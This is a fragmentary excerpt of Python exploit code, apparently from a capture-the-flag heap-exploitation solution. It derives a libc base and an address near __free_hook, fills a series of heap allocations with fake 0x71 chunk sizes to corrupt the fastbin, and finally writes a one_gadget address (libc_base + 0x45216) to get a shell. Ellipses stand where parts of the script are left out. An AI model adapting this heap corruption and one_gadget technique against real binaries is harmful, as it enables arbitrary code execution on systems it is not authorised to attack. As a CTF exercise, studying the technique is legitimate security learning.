...
freehook_near = libc_base + 0x3c6795
print hex(libc)
print hex(libc_base)
...
alloc(0x60, p64(0x71) * 11)     # 8
alloc(0x60, p64(0x71) * 11)     # 9
alloc(0x60, p64(0x71) * 11)     # 10
alloc(0x60, p64(0x71) * 11)     # 11
alloc(0x60, p64(0x71) * 11)     # 12
alloc(0x80, p64(0x71) * 11)     # 13 + 2
alloc(0x60, p64(0x71) * 11)     # 14
...
alloc(0x60, p64(0x71) * 11)     # None
alloc(0x60, "A" * 0x3 + p64(libc_base + 0x45216) * 2)     # None
